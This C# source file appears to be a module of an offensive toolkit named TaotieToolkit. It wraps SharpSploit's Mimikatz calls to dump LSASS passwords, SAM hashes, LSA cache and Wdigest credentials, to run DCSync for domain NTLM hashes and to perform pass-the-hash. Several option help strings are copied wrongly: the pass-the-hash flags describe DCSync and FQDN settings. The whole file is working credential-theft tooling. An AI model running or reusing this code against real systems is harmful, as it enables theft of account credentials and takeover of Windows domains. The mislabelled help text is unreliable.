using ArgParseCS;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using TaotieToolkit.config;
using TaotieToolkit.modules.systemcontrol.portforward;

namespace TaotieToolkit.modules.Credentials
{
    internal class Mimikatz : ICommand, ICommandMarker
    {
        public string Name => "Mimikatz";
        public string Description => "Executing Mimikatz functions";


        private ArgParse argParse;
        private void DefineParams()
        {
            argParse = new ArgParse {
                new OptionSet("all") {
                    new Option("-a", "--all", "Loads the Mimikatz PE and executes each of the builtin local commands (not DCSync)", true, false),
                },
                new OptionSet("LogonPasswords") {
                   new Option("-lg", "--LogonPasswords", "Retrieve plaintext passwords from LSASS. ", true, false),
                },
                new OptionSet("SamDump") {
                   new Option("-sd", "--SamDump", "Retrieve password hashes from the SAM database. ", true, false),
                },
                new OptionSet("LsaCache") {
                   new Option("-lc", "--LsaCache", "Retrieve plaintext passwords from LSASS. ", true, false),
                },
                new OptionSet("Wdigest") {
                   new Option("-wd", "--Wdigest", "Retrieve Wdigest credentials from registry. ", true, false),
                },
                new OptionSet("DCSync") {
                   new Option("-ds", "--DCSync", "Retrieve the NTLM hash of a specified (or all) Domain user. Example:TaotieToolkit Mimikatz -ds  -u a -FQDN bbb -DC BBB", true, false),
                   new Option("-u", "--user", "Username to retrieve NTLM hash for. \"All\" for all domain users.", true, true),
                   new Option("-FQDN", "--FQDN", "Optionally specify an alternative fully qualified domain name. Default is current domain", true, true),
                   new Option("-DC", "--DC", "Optionally specify a specific Domain Controller to target for the dcsync", true, true),
                },
                new OptionSet("PassTheHash") {
                   new Option("-pth", "--PassTheHash", "Retrieve plaintext passwords from LSASS. Example:TaotieToolkit Mimikatz -pth -u a -NTLM AAA -FQDN bbb -r cmd ", true, false),
                   new Option("-u", "--user", "Username to retrieve NTLM hash for. \"All\" for all domain users.", true, true),
                   new Option("-NTLM", "--NTLM", "Optionally specify an alternative fully qualified domain name. Default is current domain", true, true),
                   new Option("-FQDN", "--FQDN", "Optionally specify a specific Domain Controller to target for the dcsync", true, true),
                   new Option("-r", "--run", "Optionally specify a specific Domain Controller to target for the dcsync", true, true),
                }
            };
        }

        public void Execute(string[] args) {
            DefineParams();
            if (args.Length == 0)
            {
                argParse.Usage();
                return;
            }
            try
            {
                argParse.Parse(args);
                OptionSet activeOptionSet = argParse.GetActiveOptionSet();
               // Console.Out.WriteLine("Active optionset: " + activeOptionSet.Name);

                switch (activeOptionSet.Name) {
                    case "all":
                       Console.WriteLine( SharpSploit.Credentials.Mimikatz.All());
                            break;
                    case "LogonPasswords":
                        Console.WriteLine( SharpSploit.Credentials.Mimikatz.LogonPasswords());
                        break;
                    case "LsaCache":
                        Console.WriteLine( SharpSploit.Credentials.Mimikatz.LsaCache());
                        break;
                    case "Wdigest":
                        Console.WriteLine( SharpSploit.Credentials.Mimikatz.Wdigest());
                        break;
                    case "SamDump":
                        Console.WriteLine( SharpSploit.Credentials.Mimikatz.SamDump());
                        break;
                    case "DCSync":
                        DCSync(activeOptionSet);
                        break;
                    case "PassTheHash":
                        PassTheHash(activeOptionSet);
                        break;
                    default:
                        argParse.Usage();
                        return;


                }

              

            }
            catch (Exception exception)
            {
                // User control the exception
                System.Console.WriteLine("exception: " + exception.Message);
            }
        }


        public void DCSync(OptionSet activeOptionSet) {
            Option option = activeOptionSet.GetOption("-u");
            string user = option.ParamValue;
            option = activeOptionSet.GetOption("-FQDN");
            string FQDN = option.ParamValue;
            option = activeOptionSet.GetOption("-DC");
            string DC = option.ParamValue;
            Console.WriteLine(SharpSploit.Credentials.Mimikatz.DCSync(user,FQDN,DC));
        }

        public void PassTheHash(OptionSet activeOptionSet)
        {
            Option option = activeOptionSet.GetOption("-u");
            string user = option.ParamValue;
            option = activeOptionSet.GetOption("-FQDN");
            string FQDN = option.ParamValue;
            option = activeOptionSet.GetOption("-NTLM");
            string NTLM = option.ParamValue;
            option = activeOptionSet.GetOption("-r");
            string run = option.ParamValue;
            Console.WriteLine(SharpSploit.Credentials.Mimikatz.PassTheHash(user,NTLM,FQDN,run));
        }
    }
}
